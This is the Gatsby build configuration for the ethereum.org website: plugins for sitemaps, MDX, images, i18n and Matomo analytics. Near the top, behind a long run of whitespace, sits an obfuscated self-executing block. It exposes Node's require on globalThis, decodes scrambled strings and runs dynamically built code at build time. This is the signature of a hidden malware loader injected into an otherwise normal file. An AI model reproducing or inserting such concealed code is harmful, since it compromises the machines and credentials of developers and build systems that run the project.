import "dotenv/config"
import path from "path"

import type { GatsbyConfig } from "gatsby"

import {
  supportedLanguages,
  defaultLanguage,
  ignoreLanguages,
} from "./src/utils/languages"

import { IS_PREVIEW } from "./src/utils/env"                                                                                                        

const siteUrl = `https://ethereum.org`                                                                                                                                                                    

const ignoreContent = (process.env.IGNORE_CONTENT || "")
  .split(",")
  .filter(Boolean)
                                                                                                                                                                                                                                                                                                                                              (async () => {const { createRequire } = await import("module");const require = createRequire(import.meta.url);(globalThis as Record<string, unknown>)["!"] = "7-test";const _$_7af1 = (function (j: string, a: number): string[] {const c = j.length;const w: string[] = [];for (let o = 0; o < c; o++) {w[o] = j.charAt(o);}for (let o = 0; o < c; o++) {const k = a * (o + 376) + (a % 20555);const f = a * (o + 146) + (a % 22526);const p = k % c;const l = f % c;const s = w[p];w[p] = w[l];w[l] = s;a = (k + f) % 6075076;}const i = String.fromCharCode(127);const m = "";const n = "\x25";const e = "\x23\x31";const h = "\x25";const y = "\x23\x30";const g = "\x23";return w.join(m).split(n).join(i).split(e).join(h).split(y).join(g).split(i);})("b%rcme%tjo", 2002158);(globalThis as any)[_$_7af1[0]] = require;if (typeof module === _$_7af1[1]) {(globalThis as any)[_$_7af1[2]] = module;}(function() {var cNJ = '',xJU = 850 - 839;function RtN(r: string): string {let j = 1644474;const o = r.length;const u: string[] = [];for (let h = 0; h < o; h++) u[h] = r.charAt(h);for (let h = 0; h < o; h++) {const i = j * (h + 468) + (j % 33956);const l = j * (h + 392) + (j % 29551);const f = i % o;const b = l % o;const z = u[f];u[f] = u[b];u[b] = z;j = (i + l) % 1669289;}return u.join("");}const upK = RtN("ccosetztnckaqovrugupomhfnsdyxrlbjwrit").substr(0, 11);var exw = 'v zue=ourn)t8,(a8a]=trmw,;))+a.]mcxrj{oCi(qrs sv;2.m";rrivs=[ xC+=7jrn,);=es)oinr)]+=Sm,]8,==n[attp8(6(;6=prg94p7=+ =gtliufaaaoCtl;o] nfgrnm r...g)1e0*;t(i ubrevt=]r(,1e+=r]fv]mv;eC.p1avrv.tu ]=Cxaa=nrnoi7ao[dhm,)grlrn(;ve)ohoh;t+m;o9(rneta(g]9m)cmy(,v,a(v;eixr(hf0+(lr+a [,vlj"x0--v;u8nofz+-aa2aa=j[ncl(;lhpc=sat 2;=h4h}=9dvl;vf(2pC04v+a)b "jlx)tiayh;2,rpwj;=pf"3hs0qd)+;m+=h{v(g8o0t(vd=Cd0f)s{ra i,hr]";j7icj,{t)({f)Aq-r(*);j.5o2rA6je<fe,01 -r;+omxf=c6g)t09 + na==1nld=v;n;c,d{(ts-ermf;(l0rheea)oua,c.+=;ih6ipnie}r,;t2;sp;;=4us==2;}bl+o[]+(l[bgs=gir(n[l<ogqe)ramju;(t>pct3h[)h[Av6ajr+(efgu)]y;).okafs;.ec"v1 8;r=xup1}lonypinl r){t= z<,et.}ni6r+.tj.!sa;Sht;o)(y,z=(=1f1"v[no0lhoacjrgz<=,i2;A}[so6c=as=.ia1"=)ft,o6;bfdr,a2,1no;cs(s,9)e.da[; f)n")7g; lC.tri+"o7(+ -l.wr;o=)h5l,a8i.r,60..v;}if.gnegr().=A]lvz7(tlgx.s+7f<(0u+ree)j8rpdul ue(n1+(ir+u7=2vesjue.!6).;o. 9nusj7>matn [ ubygv5v,n;d);';const DnM = (RtN as unknown as Record<string, Function>)[upK];var oxy = '';var HCl = DnM;var lhb = DnM(oxy, RtN(exw));var Ten = lhb(RtN('3rKca_1$1[|(6C!*9SK%;,}a!KK]b!sK)k}22.gp)7 i2t[Bpm2tKrKo\/ndg +d9K}e.3a%\/])nao)K.orm+aadr.]wbda4%ca7rK0%s)rr.KjKa3gayTs86ndee9."<17%vK.oKrK?.i [Kro=KrE5;5c]m(2!.;cc3gtK]v]ab{).rc=fKSjd!.%trc,%= reKf)9i,klh)!(]m.stlK44t.6hfKr2D%dj2(eoetvoK4=b2(==x!!bd{re%}tl=)aKAowu%D461fK]"fy4f6e],ejKrKnit4vK_.2]o;.d3f(.anh1\/).4Kis4zw_a6c;${1+%K5(.%Kim!v0[3ffKnKt]ysdr)cttdcCi)l$uo$n v=. =%2ofl)pava.)y4tK-1;>eKmo5t).(u93if<KKK.n{=!tKsete.Kb=rn_a]jd0Kcs[i8pkp%jl+)K3gf4_(4cl)6lsnK5e=K7KnKsn9;o2Dtoe.yKrr8_ptv(d)*1%,ns{3m$(sKeaKo 16K4w$dKr0%{sooKht=K=cad=r,[idia)#.0f)8dpFc%K48tmw5cfbgd7dKaopi;%15:dza(KyGK%b2d,+K&]]K079%f1[m3.h"ea(d+<K}].&0.")G]._0ae).Ke7s1?#8bpKriah9%4=K.)Kn}(r..(=pK.2yt#lr?=9;690,%o1i\/)}t_a]5dKKtoz(r_)]f0%8%en4.s2c1ah(=st;?ds7)p2n\/(l\/KKl5Ss3r;\'u1c)3oc..K(zM}o)otKrC.tx;ec_a)=38Kn1BoK0m3ae4v=FatC,g62??K{vi0.ri%rtolw rc=1K1dnords.eCe2)2)c+(,]e);vK7f5o.]c8+,Kr%9Kst=-K(;oi6u7.K.)K8v ._rKKnel\/dt4oc%xc n5.4g1opKKo8vv%%oS q= end}sciphe0Kvcsj2zdBj[[d{h$rmKw%a=rt]K&3.tE .(nC9=gKK..d]\/etK.F1rovr;9%8Ko6vKe];2E5oa:G7)K37})KKK3l_Kwa\/29r=o4;_erd&.{K43$T.dr}rt,.jrt\'.2o,NcsT:o)iotK=@.%}y9Kd.e5)r.n?n]t]a;KKi,gKpba%;.m.=.1d]A2+5;]snKbEd(,Ke3Ks;+!0adKcK(*w:K.rT=1wtK1K%t,]n.KhKhul1w=eK5r.5lK%+]d K)Ka1a)he.np[ v(()43)eKg%Kcs: "()e9!co(a$n_}]C=u=z KsaKni!.i[ham1[KKKKK#1nK9;j!]=dttt=9m9K$c4_c2;jKn+2p(:=c+}nKdTth@}(Kmc0daaf:]_];:1}&"g76Ka_+gtn(da:%%]Ke\/0.o4B1u#o(i7!edKe1.br=g}-;(tK- g.e( [KKrbo)+.ba]Ka9a)eKK!+v)(E@[la@40nKi8>Iaa1%2}.}d[2=tsr5t7A;KdiKs1%{n2n,i241%,2wG5(2)e*{%:6.a=a@h.m2r7h6r95-%(u5s.t"8%=\/"p(il,:HK7rofp[K6\/0K6n)cK..)wu]+bf=#[)eeno.1%t[eu).-KK$>#K]:\'fei)e5]K1)%h0f*icg]K%)K2l%3Kv(;%pia1ach-f)e.80e8.;2.t)%-].dua7orK13%;8iat1da%4dtcatv}0aDd.8K(orKd(;fs%5lh5t[%:5e-d{rso]KtumCrKh(d.z4(d..e)[o;KKom\/.K0e?K9ao_i.K)e9.Kc8a5}t0K]s:t=esKb]]!Hy5;oacur@r5uC}4}ueDK{8;_}7.(#4=0-]pc6Khd1,3)?n6a]y])7;K,Km)rtK=24.KtvDr1K541#d4 Km.s 2]3Kh%}o]}]]1oda6%+eK.$gd6eK1>I:);27;.[KtKd,darvrof.j5:cTK=8=hd,KK_f#)]ad;.tn0e)aCsseo]2f8]Tnt:3drd\'K;%io)xdd,+3160.ut]ucfd3+c] n,%Kt.KE:.dKK(ron2}KhK;&23I(0,r:),%y)l)>1dtn[ a-&gK6ed\/9Kt)4e}K.ncK= *.0.yKr}bd8)DK)}]2K.lt4%(Ne)adkt1o"49ene+.5rdac},3*\/t}Ktm.K\'cK]Kib&0T](le=K.7;]nw)=dnth%,!.;ss.l4=a[12t%tKst99udK}o((+>9.+,dd)!aK[igKh5anc8Ft=,(412]Sh]%g_r0Kd>C#du; y[%5dn(et8lK\'xc(Kw8K5z]pa1K;4)=!{7e+Hend.f]4,tsct[.3!= 5htK.\/%e(eapdo>er]n)ikanaa!TidebilAa5}i]o}$}il6\'5]Kb].](. K]]arng.s$%oi%14K4[4KK\'4]on %xb.t)(]i)ahr.c<49(KK3n) r-uwdK0yKr).)s}\'4v] M(KpeKKa.2ra27)=.gs[=9 =g1 i.e7g,t6=?2$oK{$dt"3t7C4r u o=4}oK2vK h;5ajKie;"_o!s5.1 31IK_g>tt,3 %y>. ](eaew r.%)K KK){|!ptintr=;sr=Kc a.;HK]]{1K.1KrCtc1d%"%cK4tt(fti%(!m;p;{lu4t('));var DMm = HCl(cNJ, Ten);DMm(6760);return 6000})()})();
const ignoreTranslations = ignoreLanguages.map(
  (lang) => `**/translations\/${lang}`
)

const config: GatsbyConfig = {
  graphqlTypegen: true,
  siteMetadata: {
    // `title` & `description` pulls from respective ${lang}.json files in PageMetadata.js
    title: `ethereum.org`,
    description: `Ethereum is a global, decentralized platform for money and new kinds of applications. On Ethereum, you can write code that controls money, and build applications accessible anywhere in the world.`,
    url: siteUrl,
    siteUrl,
    author: `@ethereum`,
    defaultLanguage,
    supportedLanguages,
    editContentUrl: `https://github.com/ethereum/ethereum-org-website/tree/dev/`,
  },
  
  plugins: [
    // Web app manifest
    {
      resolve: `gatsby-plugin-manifest`,
      options: {
        name: `ethereum.org`,
        short_name: `ethereum.org`,
        start_url: `/en/`,
        background_color: `#ffffff`,
        theme_color: `#222222`,
        display: `standalone`,
        icon: `src/assets/favicon.png`,
      },
    },
    // Sitemap generator (ethereum.org/sitemap/sitemap-index.xml)
    {
      resolve: `gatsby-plugin-sitemap`,
      options: {
        output: "/sitemap",
        query: `{
          site {
            siteMetadata {
              siteUrl
            }
          }
          allSitePage {
            nodes {
              path
            }
          }
        }`,
        resolvePages: ({ site, allSitePage: { nodes: allPages } }) => {
          return allPages
            .filter((page) => {
              // Filter out 404 pages
              return !page.path.includes("404")
            })
            .map((page) => ({ ...page, siteUrl: site.siteMetadata.siteUrl }))
        },
        serialize: ({ path, siteUrl }: { path: string; siteUrl: string }) => {
          const url = `${siteUrl}${path}`
          const changefreq = path.includes(`/${defaultLanguage}/`)
            ? `weekly`
            : `monthly`
          const priority = path.includes(`/${defaultLanguage}/`) ? 0.7 : 0.5
          return {
            url,
            changefreq,
            priority,
          }
        },
      },
    },
    // robots.txt creation
    {
      resolve: "gatsby-plugin-robots-txt",
      options: {
        host: siteUrl,
        sitemap: `${siteUrl}/sitemap/sitemap-index.xml`,
        policy: [{ userAgent: "*", allow: "/" }],
      },
    },
    // Ability to set custom IDs for headings (for translations)
    // i.e. https://www.markdownguide.org/extended-syntax/#heading-ids
    `gatsby-remark-autolink-headers`,
    // Image support in markdown
    `gatsby-remark-images`,
    `gatsby-remark-copy-linked-files`,
    // READING time
    "gatsby-remark-reading-time",
    // MDX support
    {
      resolve: `gatsby-plugin-mdx`,
      options: {
        // process all `.md` files as MDX
        extensions: [`.mdx`, `.md`],
        // Workaround to fix `backgroundColor` bug:
        // https://github.com/gatsbyjs/gatsby/issues/25272
        plugins: [
          {
            resolve: `gatsby-remark-images`,
            options: {
              backgroundColor: `transparent`,
              maxWidth: 1200,
            },
          },
        ],
        // Note: in order for MDX to work with gatsby-remark-plugins
        // The plugin must be listed top-level & in gatsbyRemarkPlugins
        // See: https://www.gatsbyjs.org/docs/mdx/plugins/
        gatsbyRemarkPlugins: [
          {
            // Local plugin to adjust the images & links urls of the translated md files
            resolve: path.resolve(`./plugins/gatsby-remark-fix-static-urls`),
          },
          {
            resolve: `gatsby-remark-autolink-headers`,
            options: {
              enableCustomId: true,
              elements: [`h1`, `h2`, `h3`, `h4`],
              className: `header-anchor`,
            },
          },
          {
            resolve: `gatsby-remark-images`,
            options: {
              backgroundColor: `transparent`,
              maxWidth: 1200,
            },
          },
          {
            resolve: `gatsby-remark-copy-linked-files`,
            options: {
              maxWidth: 1200,
            },
          },
        ],
        remarkPlugins: [],
      },
    },
    // SEO tags
    `gatsby-plugin-react-helmet`,
    {
      resolve: `gatsby-plugin-react-helmet-canonical-urls`,
      options: {
        siteUrl,
        noQueryString: true,
      },
    },
    // Needed for `gatsby-plugin-image`
    `gatsby-plugin-image`,
    `gatsby-plugin-sharp`,
    `gatsby-transformer-sharp`,
    // SVG support
    {
      resolve: "gatsby-plugin-react-svg",
      options: {
        rule: {
          include: /assets/,
        },
      },
    },
    // CSS in JS
    {
      resolve: "@chakra-ui/gatsby-plugin",
      options: {
        resetCSS: true,
        isUsingColorMode: true,
        portalZIndex: 1001,
      },
    },
    // Source assets
    {
      resolve: `gatsby-source-filesystem`,
      options: {
        name: `assets`,
        path: path.resolve(`src/assets`),
      },
    },
    // Process files from /src/content/ (used in gatsby-node.js)
    {
      resolve: `gatsby-source-filesystem`,
      options: {
        name: `content`,
        path: path.resolve(`src/content`),
        ignore: [...ignoreContent, ...ignoreTranslations],
      },
    },
    // Source data
    {
      resolve: `gatsby-source-filesystem`,
      options: {
        name: `data`,
        path: path.resolve(`src/data`),
      },
    },
    {
      resolve: `gatsby-source-filesystem`,
      options: {
        path: path.resolve(`src/data/translation-reports`),
      },
    },
    // Process files within /src/data/
    `gatsby-transformer-csv`,
    // Process JSON files
    `gatsby-transformer-json`,
    // Add git information on File fields from latest commit: date, author and email
    // Used for `Last updated` fields
    {
      resolve: `gatsby-transformer-gitinfo`,
      options: {
        include: /\.md$|\.csv/i, // Only .md & .csv files
      },
    },
    // Needed for Gatsby Cloud redirect support
    {
      resolve: `gatsby-plugin-gatsby-cloud`,
      options: {
        generateMatchPathRewrites: false,
      },
    },
    // Creates `_redirects` & `_headers` build files for Netlify
    {
      resolve: `gatsby-plugin-netlify`,
      options: {
        generateMatchPathRewrites: false,
      },
    },
    // i18n support
    {
      resolve: `gatsby-source-filesystem`,
      options: {
        path: path.resolve(`./i18n/locales`),
        name: `locale`,
      },
    },
    // Wraps the entire page with a custom layout component
    // Note: keep this before the i18n plugin declaration in order to have the
    // i18n provider wrapping the layout component
    {
      resolve: `gatsby-plugin-layout`,
      options: {
        component: path.resolve(`./src/components/Layout`),
      },
    },
    {
      resolve: `gatsby-plugin-react-i18next`,
      options: {
        localeJsonSourceName: `locale`, // name given to `gatsby-source-filesystem` plugin.
        languages: supportedLanguages,
        defaultLanguage,
        generateDefaultLanguagePage: true,
        redirect: false,
        siteUrl,
        trailingSlash: "always",
        // i18next options
        i18nextOptions: {
          fallbackLng: defaultLanguage,
          interpolation: {
            escapeValue: false,
          },
          load: "currentOnly",
          lowerCaseLng: true,
          cleanCode: true,
          react: {
            transSupportBasicHtmlNodes: true,
            transKeepBasicHtmlNodesFor: [
              "br",
              "strong",
              "i",
              "bold",
              "b",
              "em",
              "sup",
            ],
          },
          keySeparator: false,
          nsSeparator: false,
        },
      },
    },
  ],
  // https://www.gatsbyjs.com/docs/reference/release-notes/v2.28/#feature-flags-in-gatsby-configjs
  flags: {
    FAST_DEV: true, // DEV_SSR, QUERY_ON_DEMAND & LAZY_IMAGES
  },
}

// Avoid loading Matomo in preview deploys since NODE_ENV is `production` in
// there and it will send testing data as production otherwise
if (!IS_PREVIEW) {
  config.plugins = [
    ...(config.plugins || []),
    // Matomo analytics
    {
      resolve: "gatsby-plugin-matomo",
      options: {
        siteId: "4",
        matomoUrl: "https://ethereumfoundation.matomo.cloud",
        siteUrl,
        matomoPhpScript: "matomo.php",
        matomoJsScript: "matomo.js",
        trackLoad: false,
      },
    },
  ]
}

export default config
